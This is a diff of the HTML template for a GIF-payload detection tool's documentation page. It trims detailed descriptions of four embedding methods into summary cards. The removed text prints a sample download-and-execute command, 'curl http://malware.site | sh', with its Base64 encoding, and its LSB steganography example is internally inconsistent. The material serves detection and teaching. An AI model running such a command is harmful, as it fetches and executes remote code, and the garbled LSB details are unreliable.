@@ -3,53 +3,30 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>VigilantEye - Embedding Methods Documentation</title>
+  <meta name="description" content="Overview of GIF embedding methods and steganography techniques" />
+  <title>VigilantEye - Embedding Methods Overview</title>
   <link rel="icon" type="image/svg+xml" href="{{ url_for('static', filename='favicon.svg') }}">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
+  <noscript><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"></noscript>
   <link href="{{ url_for('static', filename='style.css') }}" rel="stylesheet">
   <script src="{{ url_for('static', filename='theme.js') }}" defer></script>
   <style>
     .method-card {
-      transition: all 0.3s ease;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
       border-left: 4px solid var(--primary-color);
+      contain: layout style paint;
+      height: 100%;
     }
     .method-card:hover {
-      transform: translateX(5px);
-      box-shadow: 0 8px 24px var(--shadow-md);
+      transform: translateY(-5px);
+      box-shadow: 0 8px 20px var(--shadow-md);
     }
-    .hex-code {
-      font-family: 'Courier New', monospace;
-      background: var(--bg-overlay);
-      padding: 0.5rem;
-      border-radius: 6px;
-      font-size: 0.9rem;
+    .method-icon {
+      font-size: 3rem;
       color: var(--primary-color);
-    }
-    .tech-detail {
-      background: var(--bg-overlay);
-      padding: 1rem;
-      border-radius: 8px;
-      margin: 0.5rem 0;
-      border-left: 3px solid var(--primary-color);
-    }
-    .risk-badge {
-      display: inline-block;
-      padding: 0.3rem 0.8rem;
-      border-radius: 12px;
-      font-size: 0.85rem;
-      font-weight: 600;
-      margin: 0.25rem;
-    }
-    .risk-high { background: var(--danger-color); color: var(--text-inverse); }
-    .risk-medium { background: var(--warning-color); color: var(--text-inverse); }
-    .risk-low { background: var(--success-color); color: var(--text-inverse); }
-    .detection-method {
-      background: var(--bg-card);
-      padding: 0.75rem;
-      border-radius: 6px;
-      margin: 0.5rem 0;
+      margin-bottom: 1rem;
     }
   </style>
 </head>
@@ -134,7 +111,7 @@
           <p style="color: var(--text-primary); line-height: 1.8;">
             GIF files can be exploited to hide malicious payloads using various steganography and embedding techniques. 
             This documentation provides detailed information about four primary methods used to embed payloads into GIF files, 
-            their technical implementation, detection methods, and security implications.
+            their technical implementation, detection methods, and security implications. Click on any method below to learn more.
           </p>
         </div>
 
@@ -147,95 +124,11 @@
                 <h3 class="mb-3" style="color: var(--danger-color);">
                   <i class="bi bi-info-circle-fill"></i> Critical Research Finding: GIF Malware Execution Limitations
                 </h3>
-                <div class="tech-detail" style="background: var(--bg-card); border-left: 4px solid var(--danger-color);">
-                  <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                    <i class="bi bi-file-earmark-medical"></i> Research-Based Security Analysis
-                  </h5>
-                  <p style="color: var(--text-primary); line-height: 1.8; font-size: 1.05rem; font-weight: 500;">
-                    <strong>IMPORTANT:</strong> Based on extensive cybersecurity research, <span style="color: var(--danger-color);">malware embedded in GIF files cannot execute directly</span>. 
-                    The payload remains dormant within the file structure and requires <strong>external triggers or vulnerable applications</strong> to be activated.
-                  </p>
-                </div>
-
-                <div class="tech-detail mt-3" style="background: var(--bg-card);">
-                  <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                    <i class="bi bi-gear"></i> Why GIF Malware Cannot Execute Directly
-                  </h5>
-                  <ul style="color: var(--text-primary); line-height: 1.8;">
-                    <li><strong>File Format Limitations:</strong> GIF is a raster image format designed for visual display, not code execution. Standard image viewers and browsers treat GIFs as image data only.</li>
-                    <li><strong>No Native Execution Environment:</strong> GIF files lack an execution environment. Unlike executable files (.exe, .sh, .bat), GIFs cannot run code natively.</li>
-                    <li><strong>Isolated Payload Storage:</strong> Embedded payloads are stored as data within the file structure, separate from any execution context.</li>
-                    <li><strong>Parser Behavior:</strong> GIF parsers read image data sequentially and stop at the terminator (0x00 0x3B), ignoring appended data.</li>
-                  </ul>
-                </div>
-
-                <div class="tech-detail mt-3" style="background: var(--bg-card);">
-                  <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                    <i class="bi bi-exclamation-triangle-fill"></i> Required External Triggers for Execution
-                  </h5>
-                  <p style="color: var(--text-primary); line-height: 1.8; margin-bottom: 1rem;">
-                    For embedded malware to execute, one or more of the following conditions must be met:
-                  </p>
-                  <ol style="color: var(--text-primary); line-height: 1.8; padding-left: 1.5rem;">
-                    <li><strong>Vulnerable Application:</strong> An application with security flaws that processes GIF files incorrectly and executes appended data.</li>
-                    <li><strong>File Processing Scripts:</strong> Custom scripts or tools that extract and execute payloads from GIF files (e.g., PHP scripts that read file contents).</li>
-                    <li><strong>Server-Side Processing:</strong> Web servers or applications that process uploaded GIFs and execute embedded code (e.g., file upload vulnerabilities).</li>
-                    <li><strong>Social Engineering:</strong> Users manually extracting and executing payloads after being tricked (e.g., "extract this code and run it").</li>
-                    <li><strong>Polyglot Files:</strong> Files that are both valid GIFs and valid executables, executed as executables rather than images.</li>
-                    <li><strong>Application Vulnerabilities:</strong> Buffer overflows, code injection, or other vulnerabilities in GIF processing libraries.</li>
-                  </ol>
-                </div>
-
-                <div class="tech-detail mt-3" style="background: var(--bg-card); border-left: 4px solid var(--warning-color);">
-                  <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                    <i class="bi bi-shield-check"></i> Real-World Attack Scenarios
-                  </h5>
-                  <div style="color: var(--text-primary); line-height: 1.8;">
-                    <p><strong>Scenario 1: Web Application Vulnerability</strong></p>
-                    <ul style="margin-bottom: 1rem;">
-                      <li>Attacker uploads GIF with embedded PHP code</li>
-                      <li>Vulnerable web application processes the file</li>
-                      <li>Application extracts and executes the payload</li>
-                      <li><strong>Risk:</strong> Server compromise, data theft</li>
-                    </ul>
-
-                    <p><strong>Scenario 2: File Upload Bypass</strong></p>
-                    <ul style="margin-bottom: 1rem;">
-                      <li>Application allows only image uploads</li>
-                      <li>Attacker uploads GIF with executable payload</li>
-                      <li>If application doesn't validate file content properly, payload can be extracted</li>
-                      <li><strong>Risk:</strong> Remote code execution</li>
-                    </ul>
-
-                    <p><strong>Scenario 3: Social Engineering</strong></p>
-                    <ul>
-                      <li>Attacker distributes GIF with embedded malicious script</li>
-                      <li>Victim is instructed to extract and run the code</li>
-                      <li>Manual execution by user</li>
-                      <li><strong>Risk:</strong> System compromise if user executes</li>
-                    </ul>
-                  </div>
-                </div>
-
-                <div class="tech-detail mt-3" style="background: var(--bg-card); border-left: 4px solid var(--success-color);">
-                  <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                    <i class="bi bi-check-circle-fill"></i> Protection Mechanisms
-                  </h5>
-                  <ul style="color: var(--text-primary); line-height: 1.8;">
-                    <li><strong>File Content Validation:</strong> Always validate file content, not just extension. Check MIME types and file signatures.</li>
-                    <li><strong>Secure File Processing:</strong> Never execute or process file contents without proper sanitization.</li>
-                    <li><strong>Sandboxing:</strong> Process uploaded files in isolated environments with restricted permissions.</li>
-                    <li><strong>Input Sanitization:</strong> Sanitize all file inputs and never trust user-uploaded content.</li>
-                    <li><strong>Security Scanning:</strong> Use tools like VigilantEye to detect embedded payloads before processing.</li>
-                    <li><strong>Principle of Least Privilege:</strong> Applications processing files should have minimal system permissions.</li>
-                    <li><strong>Regular Updates:</strong> Keep GIF processing libraries and applications updated to patch vulnerabilities.</li>
-                  </ul>
-                </div>
-
-                <div class="alert alert-info mt-4" style="background: rgba(0, 212, 255, 0.15); border-left: 4px solid var(--info-color); color: var(--text-primary);">
-                  <h6 style="color: var(--info-color); margin-bottom: 0.5rem;">
-                    <i class="bi bi-lightbulb"></i> Key Takeaway
-                  </h6>
+                <p style="color: var(--text-primary); line-height: 1.8; font-size: 1.05rem; font-weight: 500;">
+                  <strong>IMPORTANT:</strong> Based on extensive cybersecurity research, <span style="color: var(--danger-color);">malware embedded in GIF files cannot execute directly</span>. 
+                  The payload remains dormant within the file structure and requires <strong>external triggers or vulnerable applications</strong> to be activated.
+                </p>
+                <div class="alert alert-info mt-3" style="background: rgba(0, 212, 255, 0.15); border-left: 4px solid var(--info-color); color: var(--text-primary);">
                   <p class="mb-0" style="line-height: 1.8;">
                     <strong>GIF files themselves are not executable.</strong> The threat comes from vulnerable applications or user actions that process 
                     and execute the embedded payload. Detection and prevention focus on identifying embedded payloads and ensuring secure file handling practices.
@@ -246,341 +139,94 @@
           </div>
         </div>
 
-        <!-- Method 1: Append After Terminator -->
-        <div class="method-card card mb-4" style="background: var(--bg-card); border: 1px solid var(--border-color);">
-          <div class="card-body p-4">
-            <div class="d-flex align-items-center justify-content-between mb-3">
-              <h3 class="mb-0" style="color: var(--primary-color);">
-                <i class="bi bi-file-plus"></i> Method 1: Append After Terminator
-              </h3>
-              <span class="risk-badge risk-high">High Risk</span>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-gear"></i> Technical Overview
-              </h5>
-              <p style="color: var(--text-primary); line-height: 1.8;">
-                This is the simplest embedding technique where malicious payloads are appended directly after the GIF file terminator 
-                sequence <span class="hex-code">0x00 0x3B</span>. The GIF terminator marks the official end of the image data, 
-                but additional data can be appended without affecting the image's visual appearance.
-              </p>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-code-square"></i> How It Works
-              </h5>
-              <ol style="color: var(--text-primary); line-height: 1.8; padding-left: 1.5rem;">
-                <li><strong>Locate Terminator:</strong> The algorithm searches for the GIF terminator sequence <span class="hex-code">0x00 0x3B</span> in the file.</li>
-                <li><strong>Extract GIF Data:</strong> All data up to and including the terminator is preserved as valid GIF content.</li>
-                <li><strong>Append Payload:</strong> The malicious payload is appended after the terminator, often wrapped in HTML comments (<span class="hex-code">&lt;!--payload--&gt;</span>) for obfuscation.</li>
-                <li><strong>File Structure:</strong> The resulting file structure is: <span class="hex-code">[GIF Data][Terminator 0x00 0x3B][Appended Payload]</span></li>
-              </ol>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-file-binary"></i> Binary Structure
-              </h5>
-              <pre class="hex-code" style="padding: 1rem; overflow-x: auto;">GIF Header (6 bytes)
-Logical Screen Descriptor (7 bytes)
-Color Table (variable)
-Image Data (variable)
-...
-GIF Terminator: 0x00 0x3B
-[PAYLOAD STARTS HERE]
-&lt;!--malicious_code--&gt;</pre>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-shield-exclamation"></i> Detection Methods
-              </h5>
-              <div class="detection-method">
-                <strong><i class="bi bi-check-circle"></i> File Size Analysis:</strong>
-                <p class="mb-0" style="color: var(--text-secondary);">Compare file size with expected GIF size. Appended data increases file size beyond normal limits.</p>
+        <!-- Method Cards Grid -->
+        <div class="row g-4 mb-5">
+          <!-- Method 1 -->
+          <div class="col-md-6 col-lg-3">
+            <a href="{{ url_for('method_append') }}" class="text-decoration-none">
+              <div class="method-card card h-100" style="background: var(--bg-card); border: 1px solid var(--border-color); cursor: pointer;">
+                <div class="card-body text-center p-4">
+                  <div class="method-icon">
+                    <i class="bi bi-file-plus"></i>
+                  </div>
+                  <h4 style="color: var(--primary-color); margin-bottom: 1rem;">Append After Terminator</h4>
+                  <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1.5rem;">
+                    Simple payload appending after GIF terminator sequence
+                  </p>
+                  <span class="badge bg-danger">High Risk</span>
+                  <div class="mt-3">
+                    <i class="bi bi-arrow-right-circle" style="color: var(--primary-color);"></i>
+                    <span style="color: var(--primary-color); font-weight: 600;">Learn More</span>
+                  </div>
+                </div>
               </div>
-              <div class="detection-method">
-                <strong><i class="bi bi-check-circle"></i> Terminator Position Check:</strong>
-                <p class="mb-0" style="color: var(--text-secondary);">Verify if data exists after the terminator sequence. Valid GIFs should end immediately after 0x00 0x3B.</p>
-              </div>
-              <div class="detection-method">
-                <strong><i class="bi bi-check-circle"></i> Hex Analysis:</strong>
-                <p class="mb-0" style="color: var(--text-secondary);">Examine hex dump for readable strings or code patterns after the terminator.</p>
-              </div>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-exclamation-triangle"></i> Security Implications
-              </h5>
-              <ul style="color: var(--text-primary); line-height: 1.8;">
-                <li><strong>Easy to Implement:</strong> Requires minimal technical knowledge, making it popular among attackers.</li>
-                <li><strong>High Success Rate:</strong> Most image viewers ignore data after the terminator, allowing payloads to go unnoticed.</li>
-                <li><strong>Execution Risk:</strong> <span style="color: var(--warning-color);">Requires external trigger</span> - The payload cannot execute directly. It needs a vulnerable application or script to extract and execute it.</li>
-                <li><strong>Stealth:</strong> The GIF appears normal visually, making it difficult for users to detect the threat.</li>
-                <li><strong>Research Finding:</strong> Based on security research, GIF-embedded malware requires vulnerable file processing applications or user intervention to execute.</li>
-              </ul>
-            </div>
+            </a>
           </div>
-        </div>
 
-        <!-- Method 2: Comment Extension -->
-        <div class="method-card card mb-4" style="background: var(--bg-card); border: 1px solid var(--border-color);">
-          <div class="card-body p-4">
-            <div class="d-flex align-items-center justify-content-between mb-3">
-              <h3 class="mb-0" style="color: var(--primary-color);">
-                <i class="bi bi-chat-left-text"></i> Method 2: GIF Comment Extension
-              </h3>
-              <span class="risk-badge risk-medium">Medium Risk</span>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-gear"></i> Technical Overview
-              </h5>
-              <p style="color: var(--text-primary); line-height: 1.8;">
-                GIF format supports comment extensions (Extension Introducer <span class="hex-code">0x21</span> + Comment Label 
-                <span class="hex-code">0xFE</span>) that can contain arbitrary text data. This method exploits the legitimate GIF 
-                comment feature to embed malicious payloads within the file structure itself, making it more integrated than simple appending.
-              </p>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-code-square"></i> How It Works
-              </h5>
-              <ol style="color: var(--text-primary); line-height: 1.8; padding-left: 1.5rem;">
-                <li><strong>Extension Block Creation:</strong> Creates a comment extension block with structure: <span class="hex-code">0x21 0xFE [size] [data]</span></li>
-                <li><strong>Chunking:</strong> Payload is split into 255-byte chunks (GIF comment limit per block) to accommodate larger payloads.</li>
-                <li><strong>Insertion Point:</strong> Comment extension is inserted after the Logical Screen Descriptor (typically at offset 13) but before image data.</li>
-                <li><strong>Multiple Blocks:</strong> For payloads exceeding 255 bytes, multiple comment blocks are chained together.</li>
-                <li><strong>Termination:</strong> Each block sequence ends with <span class="hex-code">0x00</span> terminator.</li>
-              </ol>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-file-binary"></i> Binary Structure
-              </h5>
-              <pre class="hex-code" style="padding: 1rem; overflow-x: auto;">GIF Header: GIF89a (6 bytes)
-Logical Screen Descriptor (7 bytes)
-[COMMENT EXTENSION STARTS]
-0x21 (Extension Introducer)
-0xFE (Comment Label)
-0xFF (Block Size - max 255)
-[Payload Data - 255 bytes]
-0x21 0xFE 0xFF [More Payload]
-...
-0x00 (Terminator)
-[Image Data Continues]</pre>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-shield-exclamation"></i> Detection Methods
-              </h5>
-              <div class="detection-method">
-                <strong><i class="bi bi-check-circle"></i> Extension Block Parsing:</strong>
-                <p class="mb-0" style="color: var(--text-secondary);">Parse GIF structure and identify comment extension blocks (0x21 0xFE sequences).</p>
+          <!-- Method 2 -->
+          <div class="col-md-6 col-lg-3">
+            <a href="{{ url_for('method_comment') }}" class="text-decoration-none">
+              <div class="method-card card h-100" style="background: var(--bg-card); border: 1px solid var(--border-color); cursor: pointer;">
+                <div class="card-body text-center p-4">
+                  <div class="method-icon">
+                    <i class="bi bi-chat-left-text"></i>
+                  </div>
+                  <h4 style="color: var(--primary-color); margin-bottom: 1rem;">Comment Extension</h4>
+                  <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1.5rem;">
+                    Embedding payloads in GIF comment extension blocks
+                  </p>
+                  <span class="badge bg-warning">Medium Risk</span>
+                  <div class="mt-3">
+                    <i class="bi bi-arrow-right-circle" style="color: var(--primary-color);"></i>
+                    <span style="color: var(--primary-color); font-weight: 600;">Learn More</span>
+                  </div>
+                </div>
               </div>
-              <div class="detection-method">
-                <strong><i class="bi bi-check-circle"></i> Comment Content Analysis:</strong>
-                <p class="mb-0" style="color: var(--text-secondary);">Extract and analyze content from comment extensions for suspicious patterns.</p>
-              </div>
-              <div class="detection-method">
-                <strong><i class="bi bi-check-circle"></i> Structure Validation:</strong>
-                <p class="mb-0" style="color: var(--text-secondary);">Verify if comment extensions contain executable code or suspicious strings.</p>
-              </div>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-exclamation-triangle"></i> Security Implications
-              </h5>
-              <ul style="color: var(--text-primary); line-height: 1.8;">
-                <li><strong>Legitimate Feature Abuse:</strong> Uses a standard GIF feature, making it harder to detect as malicious.</li>
-                <li><strong>Integrated Payload:</strong> Payload is part of the GIF structure, not appended, making it more persistent.</li>
-                <li><strong>Size Limitations:</strong> 255-byte chunks limit payload size but can be chained for larger payloads.</li>
-                <li><strong>Metadata Extraction:</strong> Some tools extract GIF comments, potentially exposing the payload.</li>
-                <li><strong>Execution Requirement:</strong> <span style="color: var(--warning-color);">Cannot execute directly</span> - Requires vulnerable applications that process comment extensions and execute extracted content.</li>
-              </ul>
-            </div>
+            </a>
           </div>
-        </div>
 
-        <!-- Method 3: Base64 Append -->
-        <div class="method-card card mb-4" style="background: var(--bg-card); border: 1px solid var(--border-color);">
-          <div class="card-body p-4">
-            <div class="d-flex align-items-center justify-content-between mb-3">
-              <h3 class="mb-0" style="color: var(--primary-color);">
-                <i class="bi bi-shield-lock"></i> Method 3: Base64 Encoded Append
-              </h3>
-              <span class="risk-badge risk-high">High Risk</span>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-gear"></i> Technical Overview
-              </h5>
-              <p style="color: var(--text-primary); line-height: 1.8;">
-                This method combines the simplicity of appending with obfuscation through Base64 encoding. The payload is first 
-                Base64-encoded to obscure its content, then appended after the GIF terminator with a <span class="hex-code">base64:</span> 
-                prefix marker. This makes the payload less immediately recognizable as malicious code.
-              </p>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-code-square"></i> How It Works
-              </h5>
-              <ol style="color: var(--text-primary); line-height: 1.8; padding-left: 1.5rem;">
-                <li><strong>Encode Payload:</strong> Original payload is Base64-encoded, converting binary/text to ASCII-safe representation.</li>
-                <li><strong>Size Expansion:</strong> Base64 encoding increases payload size by approximately 33% (4 output bytes for every 3 input bytes).</li>
-                <li><strong>Append with Marker:</strong> Encoded payload is appended after terminator with <span class="hex-code">base64:</span> prefix for identification.</li>
-                <li><strong>Decoding Required:</strong> Attackers must Base64-decode the payload before execution, adding a layer of obfuscation.</li>
-              </ol>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-file-binary"></i> Binary Structure
-              </h5>
-              <pre class="hex-code" style="padding: 1rem; overflow-x: auto;">[GIF Data]
-Terminator: 0x00 0x3B
-base64:Y3VybCBodHRwOi8vbWFsd2FyZS5zaXRlIHwgc2g=
-[Base64 Encoded Payload]
-Example: "curl http://malware.site | sh"
-Encoded: "Y3VybCBodHRwOi8vbWFsd2FyZS5zaXRlIHwgc2g="</pre>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-shield-exclamation"></i> Detection Methods
-              </h5>
-              <div class="detection-method">
-                <strong><i class="bi bi-check-circle"></i> Base64 Pattern Recognition:</strong>
-                <p class="mb-0" style="color: var(--text-secondary);">Search for Base64-encoded strings (character set: A-Z, a-z, 0-9, +, /, =) after terminator.</p>
+          <!-- Method 3 -->
+          <div class="col-md-6 col-lg-3">
+            <a href="{{ url_for('method_base64') }}" class="text-decoration-none">
+              <div class="method-card card h-100" style="background: var(--bg-card); border: 1px solid var(--border-color); cursor: pointer;">
+                <div class="card-body text-center p-4">
+                  <div class="method-icon">
+                    <i class="bi bi-shield-lock"></i>
+                  </div>
+                  <h4 style="color: var(--primary-color); margin-bottom: 1rem;">Base64 Encoded Append</h4>
+                  <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1.5rem;">
+                    Base64-encoded payload appended after terminator
+                  </p>
+                  <span class="badge bg-danger">High Risk</span>
+                  <div class="mt-3">
+                    <i class="bi bi-arrow-right-circle" style="color: var(--primary-color);"></i>
+                    <span style="color: var(--primary-color); font-weight: 600;">Learn More</span>
+                  </div>
+                </div>
               </div>
-              <div class="detection-method">
-                <strong><i class="bi bi-check-circle"></i> Marker Detection:</strong>
-                <p class="mb-0" style="color: var(--text-secondary);">Look for <span class="hex-code">base64:</span> prefix markers in appended data.</p>
-              </div>
-              <div class="detection-method">
-                <strong><i class="bi bi-check-circle"></i> Decode and Analyze:</strong>
-                <p class="mb-0" style="color: var(--text-secondary);">Base64-decode suspicious strings and analyze decoded content for malicious patterns.</p>
-              </div>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-exclamation-triangle"></i> Security Implications
-              </h5>
-              <ul style="color: var(--text-primary); line-height: 1.8;">
-                <li><strong>Obfuscation:</strong> Base64 encoding hides the true nature of the payload from casual inspection.</li>
-                <li><strong>Evasion:</strong> String-based detection may miss Base64-encoded payloads if not properly decoded.</li>
-                <li><strong>Common Technique:</strong> Widely used in real-world attacks due to simplicity and effectiveness.</li>
-                <li><strong>Decoding Overhead:</strong> Requires decoding step, but this is trivial for automated attacks.</li>
-                <li><strong>Execution Limitation:</strong> <span style="color: var(--warning-color);">Research shows</span> Base64-encoded payloads in GIFs still require external execution triggers - they cannot auto-execute.</li>
-              </ul>
-            </div>
+            </a>
           </div>
-        </div>
 
-        <!-- Method 4: LSB Steganography -->
-        <div class="method-card card mb-4" style="background: var(--bg-card); border: 1px solid var(--border-color);">
-          <div class="card-body p-4">
-            <div class="d-flex align-items-center justify-content-between mb-3">
-              <h3 class="mb-0" style="color: var(--primary-color);">
-                <i class="bi bi-eye-slash"></i> Method 4: LSB Steganography
-              </h3>
-              <span class="risk-badge risk-low">Low Visibility</span>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-gear"></i> Technical Overview
-              </h5>
-              <p style="color: var(--text-primary); line-height: 1.8;">
-                Least Significant Bit (LSB) steganography is an advanced technique that hides payload data within the pixel data itself. 
-                By modifying the least significant bit of color channels (Red, Green, Blue), the payload is distributed across the image 
-                pixels. This method is extremely difficult to detect visually, as the changes are imperceptible to the human eye.
-              </p>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-code-square"></i> How It Works
-              </h5>
-              <ol style="color: var(--text-primary); line-height: 1.8; padding-left: 1.5rem;">
-                <li><strong>Payload Conversion:</strong> Payload text is converted to binary (8 bits per character).</li>
-                <li><strong>Pixel Modification:</strong> For each pixel's RGB values, the LSB (rightmost bit) is replaced with payload bits.</li>
-                <li><strong>Bit Distribution:</strong> Payload bits are distributed across multiple pixels: R channel → bit 1, G channel → bit 2, B channel → bit 3, etc.</li>
-                <li><strong>End Marker:</strong> Special bit sequence (1111111111111110) marks the end of the payload.</li>
-                <li><strong>Frame Processing:</strong> For animated GIFs, payload can be distributed across multiple frames.</li>
-              </ol>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-file-binary"></i> Binary Structure
-              </h5>
-              <pre class="hex-code" style="padding: 1rem; overflow-x: auto;">Pixel RGB Values:
-Original: R=255 (11111111), G=128 (10000000), B=64 (01000000)
-Payload Bit: 1
-
-Modified: R=255 (11111111), G=129 (10000001), B=65 (01000001)
-          ↑ unchanged    ↑ LSB=1      ↑ LSB=1
-
-Example:
-Character: 'A' = 65 = 01000001 (binary)
-Hidden in 3 pixels:
-  Pixel 1: R LSB = 0, G LSB = 1
-  Pixel 2: R LSB = 0, G LSB = 0
-  Pixel 3: R LSB = 0, G LSB = 0
-  Pixel 4: R LSB = 0, G LSB = 0
-  Pixel 5: R LSB = 0, G LSB = 0
-  Pixel 6: R LSB = 0, G LSB = 0
-  Pixel 7: R LSB = 0, G LSB = 1
-  Pixel 8: R LSB = 1, G LSB = 0</pre>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-shield-exclamation"></i> Detection Methods
-              </h5>
-              <div class="detection-method">
-                <strong><i class="bi bi-check-circle"></i> Statistical Analysis:</strong>
-                <p class="mb-0" style="color: var(--text-secondary);">Analyze LSB distribution patterns. Natural images have random LSBs, while steganography creates patterns.</p>
+          <!-- Method 4 -->
+          <div class="col-md-6 col-lg-3">
+            <a href="{{ url_for('method_lsb') }}" class="text-decoration-none">
+              <div class="method-card card h-100" style="background: var(--bg-card); border: 1px solid var(--border-color); cursor: pointer;">
+                <div class="card-body text-center p-4">
+                  <div class="method-icon">
+                    <i class="bi bi-eye-slash"></i>
+                  </div>
+                  <h4 style="color: var(--primary-color); margin-bottom: 1rem;">LSB Steganography</h4>
+                  <p style="color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 1.5rem;">
+                    Advanced pixel-level data hiding technique
+                  </p>
+                  <span class="badge bg-success">Low Visibility</span>
+                  <div class="mt-3">
+                    <i class="bi bi-arrow-right-circle" style="color: var(--primary-color);"></i>
+                    <span style="color: var(--primary-color); font-weight: 600;">Learn More</span>
+                  </div>
+                </div>
               </div>
-              <div class="detection-method">
-                <strong><i class="bi bi-check-circle"></i> Chi-Square Test:</strong>
-                <p class="mb-0" style="color: var(--text-secondary);">Statistical test to detect non-random LSB distributions indicating hidden data.</p>
-              </div>
-              <div class="detection-method">
-                <strong><i class="bi bi-check-circle"></i> Visual Inspection:</strong>
-                <p class="mb-0" style="color: var(--text-secondary);">Extract and visualize LSB planes to identify patterns or anomalies.</p>
-              </div>
-              <div class="detection-method">
-                <strong><i class="bi bi-check-circle"></i> Steganalysis Tools:</strong>
-                <p class="mb-0" style="color: var(--text-secondary);">Use specialized tools like StegExpose, StegAlyzerAS, or custom LSB extraction algorithms.</p>
-              </div>
-            </div>
-
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-exclamation-triangle"></i> Security Implications
-              </h5>
-              <ul style="color: var(--text-primary); line-height: 1.8;">
-                <li><strong>High Stealth:</strong> Visually identical to original image, making detection extremely difficult.</li>
-                <li><strong>Capacity Limitations:</strong> Limited by image size. Can hide ~1 bit per pixel (3 bits per RGB pixel).</li>
-                <li><strong>Computational Overhead:</strong> Requires pixel-level processing, more complex than other methods.</li>
-                <li><strong>Advanced Technique:</strong> Requires sophisticated tools and knowledge, less common in basic attacks.</li>
-                <li><strong>Forensic Challenges:</strong> Difficult to detect without specialized steganalysis tools.</li>
-                <li><strong>Execution Barrier:</strong> <span style="color: var(--warning-color);">Even with LSB steganography</span>, the hidden payload cannot execute from the GIF file itself - it requires extraction and external execution mechanisms.</li>
-              </ul>
-            </div>
+            </a>
           </div>
         </div>
 
@@ -588,7 +234,7 @@ Hidden in 3 pixels:
         <div class="card mb-4" style="background: var(--bg-card); border: 1px solid var(--border-color);">
           <div class="card-body p-4">
             <h3 class="mb-4" style="color: var(--primary-color);">
-              <i class="bi bi-table"></i> Method Comparison
+              <i class="bi bi-table"></i> Quick Comparison
             </h3>
             <div class="table-responsive">
               <table class="table" style="color: var(--text-primary);">
@@ -636,93 +282,6 @@ Hidden in 3 pixels:
           </div>
         </div>
 
-        <!-- Best Practices -->
-        <div class="card mb-4" style="background: var(--bg-card); border: 1px solid var(--border-color);">
-          <div class="card-body p-4">
-            <h3 class="mb-4" style="color: var(--primary-color);">
-              <i class="bi bi-shield-check"></i> Detection Best Practices
-            </h3>
-            <div class="row g-3">
-              <div class="col-md-6">
-                <div class="tech-detail">
-                  <h5><i class="bi bi-file-check"></i> File Analysis</h5>
-                  <ul style="color: var(--text-primary);">
-                    <li>Compare file size with expected values</li>
-                    <li>Check for data after GIF terminator</li>
-                    <li>Analyze file structure integrity</li>
-                    <li>Verify extension block contents</li>
-                  </ul>
-                </div>
-              </div>
-              <div class="col-md-6">
-                <div class="tech-detail">
-                  <h5><i class="bi bi-search"></i> Content Scanning</h5>
-                  <ul style="color: var(--text-primary);">
-                    <li>Search for suspicious strings</li>
-                    <li>Detect Base64-encoded content</li>
-                    <li>Analyze comment extensions</li>
-                    <li>Extract and decode hidden data</li>
-                  </ul>
-                </div>
-              </div>
-              <div class="col-md-6">
-                <div class="tech-detail">
